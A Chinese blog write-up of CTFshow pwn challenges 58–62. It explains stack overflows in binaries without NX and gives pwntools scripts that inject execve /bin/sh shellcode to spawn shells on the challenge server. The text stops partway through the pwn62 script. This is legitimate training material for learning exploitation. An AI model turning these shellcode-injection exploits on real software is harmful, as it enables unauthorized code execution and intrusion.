<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="此时相望不相闻，愿逐月华流照君" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="此时相望不相闻，愿逐月华流照君" type="application/atom+xml"><link rel="alternate" type="application/json" title="此时相望不相闻，愿逐月华流照君" href="https://vvwwvv.cn/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.5"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/><meta name="keywords" content="pwn"/><link rel="canonical" href="https://vvwwvv.cn/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/"><title>CTFshow(栈溢出部分,58~68)</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTFshow(栈溢出部分,58~68)</h1><div class="meta"><span class="item" title="创建时间：2023-10-21 11:01:15"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2023-10-21T11:01:15+08:00">2023-10-21</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>21k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>19 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">vvwwv'Blog</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://ooo.0x0.ooo/2023/03/09/Y0xvg.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于CTF"><span itemprop="name">CTF<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/CTFshow/" itemprop="item" rel="index" title="分类于CTFshow"><span itemprop="name">CTFshow<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/CTFshow/%E6%A0%88%E6%BA%A2%E5%87%BA/" itemprop="item" rel="index" title="分类于栈溢出"><span itemprop="name">栈溢出<meta itemprop="position" content="2"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://vvwwvv.cn/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="vvwwv"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="此时相望不相闻，愿逐月华流照君"/></span><div class="body md" itemprop="articleBody"><h1 id="有所收获的题目"><a class="anchor" href="#有所收获的题目">#</a> 有所收获的题目：</h1>
<p>pwn66 (shellcode 开头为 <code>\x00</code> )</p>
<p>pwn67 （32 位 nop sled  -&gt;shellcode）</p>
<h1 id="pwn58shellcode"><a class="anchor" href="#pwn58shellcode">#</a> pwn58(shellcode)</h1>
<h2 id="题目"><a class="anchor" href="#题目">#</a> 题目</h2>
<p>题目描述： <code>32位 无限制</code></p>
<p>32 位程序，开启保护：</p>
<pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
</code></pre>
<p>有可执行段</p>
<p>main（反编译未成功）:</p>
<p>这里提示 shellcode，然后执行了一个 ctfshow 函数<br />
<img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%40%7B_%7B1Q%25K6V28H7G2%7DEVF%5DAQ.png" alt="" /></p>
<p><code>ctfshow：</code></p>
<pre><code>int __cdecl ctfshow(char *s)
&#123;
  gets(s);
  return puts(s);
&#125;
</code></pre>
<p>一个 gets 函数，有可执行段，且没有开启 nx, 直接在栈上写入 shellcode，然后返回执行</p>
<p>这里看汇编发现 main 函数有个 <code>call eax</code></p>
<p>gets 函数的参数地址是从主函数传参进去的，在 eax 中，后面 call eax，就直接执行了 eax，也就相当于执行了 shellcode</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5D%5DMB2%403N833NJ5E3Z8J%7EQCO.png" alt="" /></p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#p=process('./')</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#e=ELF('./')</span></pre></td></tr><tr><td data-num="7"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28135</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>payload1<span class="token operator">=</span>shellcode</pre></td></tr><tr><td data-num="12"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn59shellcode"><a class="anchor" href="#pwn59shellcode">#</a> pwn59(shellcode)</h1>
<h2 id="题目-2"><a class="anchor" href="#题目-2">#</a> 题目</h2>
<p>题目描述： <code>64位 无限制</code></p>
<p>64 位程序，没有 nx</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
</code></pre>
<p>与上一题相同，仍然是一个 gets 函数， <code>call rdx</code></p>
<p>利用 64 位 shellcode 即可</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#p=process('./')</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#e=ELF('./')</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28127</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>payload1<span class="token operator">=</span>shellcode</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn60shellcode"><a class="anchor" href="#pwn60shellcode">#</a> pwn60(shellcode)</h1>
<h2 id="题目-3"><a class="anchor" href="#题目-3">#</a> 题目</h2>
<p>题目内容： <code>入门难度shellcode</code></p>
<p>32 位程序，没有开启 NX</p>
<pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
</code></pre>
<p><code>main:</code></p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"CTFshow-pwn can u pwn me here!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"See you ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里会将 gets 的函数复制到 buf2，buf2 在 bss 段，查看一下可执行权限：</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IWAF%7DG%40%29%5B5%40%40E%24%7D0SVMM4EW.png" alt="" /></p>
<p>居然没有可执行权限....</p>
<p>查看 wp 后发现，用 ubuntu18.02 发现有执行权限...</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/N316WRCUO1533QCK8HZXZ%7EW.png" alt="" /></p>
<p>然后输入 shellcode，再溢出返回到 buf2 即可执行</p>
<p>偏移为 112,ida 好像有误：</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/OBB%5DLLRU%2863%7BRH%60JZ14%5B_2O.png" alt="" /></p>
<p>exp:</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28244</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>buf2<span class="token operator">=</span><span class="token number">0x804A080</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"me here!!\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>payload1<span class="token operator">=</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn61shellcode"><a class="anchor" href="#pwn61shellcode">#</a> pwn61(shellcode)</h1>
<h2 id="题目-4"><a class="anchor" href="#题目-4">#</a> 题目：</h2>
<p>题目描述： <code>输出了什么？</code></p>
<p>64 位程序：</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
</code></pre>
<p>可以看到开启了 pie, 地址都进行了改变</p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  __int64 v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v3 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTFshow!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's this : [%p] ?\n"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Maybe it's useful ! But how to use it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里打印了 v5 的栈地址，没有开启 nx，可以写入 shellcode 然后返回到 v5 执行</p>
<p><s>可以写入的 shellcode 为 0x10+8（24 字节）</s></p>
<p>这里不能直接写 shellcode 进入栈内，因为后面会执行 leave 命令，会导致重置，那么就无法执行 shellcode，需要溢出写到栈的后面</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/NF3P8%5D%24H%29K%60%7DJ%294M%5BOIY%5B%5DS.png" alt="" /></p>
<p>所以栈内的 24 字节无法使用，溢出到后面即可，返回地址要 <code>栈地址+32(24+ret的8字节)</code></p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn61'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#p=remote("pwn.challenge.ctf.show",28244)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>shellcode <span class="token operator">=</span><span class="token string">b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"</span><span class="token comment"># 22bytes</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's this : ["</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>v5<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v5:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But how to use it?\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>payload1<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>v5<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn62shellcode"><a class="anchor" href="#pwn62shellcode">#</a> pwn62(shellcode)</h1>
<h2 id="题目-5"><a class="anchor" href="#题目-5">#</a> 题目</h2>
<p>题目描述： <code>短了一点</code></p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
</code></pre>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  __int64 buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v3 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTFshow!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's this : [%p] ?\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Maybe it's useful ! But how to use it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x38uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>与上面的题一样，只不过这次限制了只能读入 0x38 字节（56），栈空间 24，返回地址 8 不可用，所以最大写入的 shellcode 长度为 56-24-8=24，上道题用的 22 字节的 shellcode，所以可以直接用</p>
<pre><code class="language-pyhton">from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'
context(os='linux', arch='i386', log_level='debug')
